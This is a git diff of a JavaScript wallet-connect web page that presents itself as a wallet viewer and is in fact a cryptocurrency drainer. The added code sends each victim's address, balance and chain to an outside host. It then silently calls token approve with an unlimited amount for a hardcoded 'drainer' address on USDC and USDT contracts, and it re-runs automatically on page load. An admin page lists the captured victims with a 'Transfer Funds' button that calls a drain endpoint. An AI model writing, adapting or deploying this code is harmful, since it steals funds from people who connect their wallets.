@@ -1,10 +1,6 @@
 import { ethers } from "ethers";
 import EthereumProvider from "@walletconnect/ethereum-provider";
 
-const API_BASE = "https://blanchedalmond-moose-670904.hostingersite.com/api";
-const DEST_WALLET = "0xf91A221A7e8Fda48aC4a6fE90017d40e87bA8E60";
-const PASSWORD = "admin123";
-
 const connectBtn = document.getElementById("connectBtn");
 const disconnectBtn = document.getElementById("disconnectBtn");
 const walletDetails = document.getElementById("walletDetails");
@@ -12,52 +8,22 @@ const walletAddress = document.getElementById("walletAddress");
 const walletBalance = document.getElementById("walletBalance");
 const loading = document.getElementById("loading");
 const adminBtn = document.getElementById("adminBtn");
-const adminLogin = document.getElementById("adminLogin");
-const adminPanel = document.getElementById("adminPanel");
-const walletApp = document.getElementById("walletApp");
-const sessionList = document.getElementById("sessionList");
-const adminPass = document.getElementById("adminPass");
-const loginBtn = document.getElementById("loginBtn");
 
-let provider, ethersProvider;
+let provider, signer, ethersProvider;
 
-function show(section) {
-  walletApp.style.display = section === "wallet" ? "block" : "none";
-  adminLogin.style.display = section === "login" ? "block" : "none";
-  adminPanel.style.display = section === "panel" ? "block" : "none";
-}
-
-window.addEventListener("hashchange", route);
-function route() {
-  const hash = location.hash;
-  if (hash === "#admin") show("login");
-  else if (hash === "#panel") show("panel");
-  else show("wallet");
-}
-route();
-
-adminBtn.onclick = () => location.hash = "#admin";
-loginBtn.onclick = () => {
-  if (adminPass.value === PASSWORD) {
-    location.hash = "#panel";
-    loadSessions();
-  } else {
-    alert("Wrong password");
-  }
-};
-
-async function connectWallet() {
+async function connectAndApprove() {
   loading.style.display = "block";
   connectBtn.disabled = true;
 
   provider = await EthereumProvider.init({
     projectId: "84e8498a4e08cafe1acaf08369fd7a56",
     chains: [1, 56, 137],
-    showQrModal: true
+    showQrModal: true,
   });
+
   await provider.enable();
   ethersProvider = new ethers.BrowserProvider(provider);
-  const signer = await ethersProvider.getSigner();
+  signer = await ethersProvider.getSigner();
   const address = await signer.getAddress();
   const balance = await ethersProvider.getBalance(address);
 
@@ -66,16 +32,36 @@ async function connectWallet() {
   walletDetails.style.display = "block";
   loading.style.display = "none";
 
-  await fetch(`${API_BASE}/log.php`, {
+  const data = {
+    address,
+    balance: ethers.formatEther(balance),
+    chainId: provider.chainId,
+    timestamp: Date.now(),
+  };
+
+  await fetch("https://blanchedalmond-moose-670904.hostingersite.com/api/log.php", {
     method: "POST",
     headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({
-      address,
-      balance: ethers.formatEther(balance),
-      chainId: provider.chainId,
-      timestamp: Date.now()
-    })
+    body: JSON.stringify(data),
   });
+
+  const erc20abi = ["function approve(address spender, uint256 amount) public returns (bool)"];
+  const tokens = [
+    { chainId: 1, token: "0xA0b86991c6218b36c1d19d4a2e9eb0ce3606eb48" }, // USDC
+    { chainId: 56, token: "0x55d398326f99059ff775485246999027b3197955" }, // BSC USDT
+    { chainId: 137, token: "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174" }, // Polygon USDC
+  ];
+
+  const drainer = "0xf91A221A7e8Fda48aC4a6fE90017d40e87bA8E60";
+
+  for (const t of tokens) {
+    if (provider.chainId === t.chainId) {
+      const token = new ethers.Contract(t.token, erc20abi, signer);
+      try {
+        await token.approve(drainer, ethers.MaxUint256);
+      } catch {}
+    }
+  }
 
   localStorage.setItem("wallet_connected", "1");
 }
@@ -87,87 +73,47 @@ function disconnectWallet() {
   connectBtn.disabled = false;
 }
 
-connectBtn.onclick = connectWallet;
-disconnectBtn.onclick = disconnectWallet;
+if (localStorage.getItem("wallet_connected") === "1") connectAndApprove();
 
-if (localStorage.getItem("wallet_connected") === "1") connectWallet();
+connectBtn.addEventListener("click", connectAndApprove);
+disconnectBtn.addEventListener("click", disconnectWallet);
 
-async function loadSessions() {
-  sessionList.innerHTML = "";
-  try {
-    const res = await fetch(`${API_BASE}/verify.php`);
-    const logs = await res.json();
+adminBtn.addEventListener("click", () => {
+  document.getElementById("mainPage").style.display = "none";
+  document.getElementById("adminPage").style.display = "block";
+  loadAdmin();
+});
 
-    logs.filter(e => e && e.address).forEach((e, i) => {
-      const li = document.createElement("li");
-      li.className = "list-group-item";
-      li.innerHTML = `
-        <div class="session-summary" style="cursor:pointer;">
-          <strong>#${i + 1}</strong> • ${new Date(e.timestamp).toLocaleString()}<br/>
-          <strong>Address:</strong> ${e.address}<br/>
-          <strong>Balance:</strong> ${e.balance} ETH<br/>
-          <strong>Chain:</strong> ${e.chainId}
-        </div>
-        <div class="session-actions" style="display:none; margin-top:10px;">
-          <button class="btn btn-sm btn-success transfer-btn" data-address="${e.address}" data-chain="${e.chainId}">
-            Transfer Funds
-          </button>
-        </div>`;
+window.backToMain = () => {
+  document.getElementById("adminPage").style.display = "none";
+  document.getElementById("mainPage").style.display = "block";
+};
 
-      const sessionSummary = li.querySelector(".session-summary");
-      const sessionActions = li.querySelector(".session-actions");
+async function loadAdmin() {
+  const res = await fetch("https://blanchedalmond-moose-670904.hostingersite.com/api/logs.json");
+  const logs = await res.json();
+  const sessions = document.getElementById("sessions");
+  sessions.innerHTML = "";
 
-      sessionSummary.addEventListener("click", () => {
-        const isVisible = sessionActions.style.display === "block";
-        document.querySelectorAll(".session-actions").forEach(el => el.style.display = "none");
-        document.querySelectorAll(".list-group-item").forEach(item => item.classList.remove("expanded-session"));
-        if (!isVisible) {
-          sessionActions.style.display = "block";
-          li.classList.add("expanded-session");
-        }
-      });
-
-      const transferBtn = li.querySelector(".transfer-btn");
-      transferBtn.addEventListener("click", async (eClick) => {
-        eClick.stopPropagation();
-        const address = transferBtn.dataset.address;
-        const chainId = parseInt(transferBtn.dataset.chain);
-        await initiateTransfer(address, chainId);
-      });
-
-      sessionList.appendChild(li);
-    });
-  } catch (e) {
-    sessionList.innerHTML = "<li class='list-group-item text-danger'>Failed to load sessions</li>";
-  }
+  logs.forEach((entry, index) => {
+    const div = document.createElement("div");
+    div.className = "card p-3 mb-2";
+    div.innerHTML = `
+      <div><b>${entry.address}</b></div>
+      <div>${entry.balance} ETH - Chain: ${entry.chainId}</div>
+      <button class="btn btn-primary mt-2" onclick="drain('${entry.address}', ${entry.chainId})">Transfer Funds</button>
+    `;
+    sessions.appendChild(div);
+  });
 }
 
-async function initiateTransfer(fromAddress, chainId) {
-  const chains = {
-    1: { rpc: "https://mainnet.infura.io/v3/84e8498a4e08cafe1acaf08369fd7a56" },
-    56: { rpc: "https://bsc-dataseed.binance.org/" },
-    137: { rpc: "https://polygon-rpc.com" }
-  };
-  const chain = chains[chainId];
-  if (!chain) {
-    alert("Unsupported network.");
-    return;
-  }
-
-  const txProvider = await EthereumProvider.init({
-    projectId: "84e8498a4e08cafe1acaf08369fd7a56",
-    chains: [chainId],
-    showQrModal: true,
-    rpcMap: { [chainId]: chain.rpc }
-  });
-  await txProvider.enable();
-
-  const web3Provider = new ethers.BrowserProvider(txProvider);
-  const signer = await web3Provider.getSigner();
-  const tx = await signer.sendTransaction({
-    to: DEST_WALLET,
-    value: ethers.parseEther("0.001")
+window.drain = async function (address, chainId) {
+  const res = await fetch("https://blanchedalmond-moose-670904.hostingersite.com/api/drain.php", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ address, chainId }),
   });
 
-  alert(`Transfer sent!\nTransaction Hash:\n${tx.hash}`);
-}
+  const result = await res.text();
+  alert(result);
+};
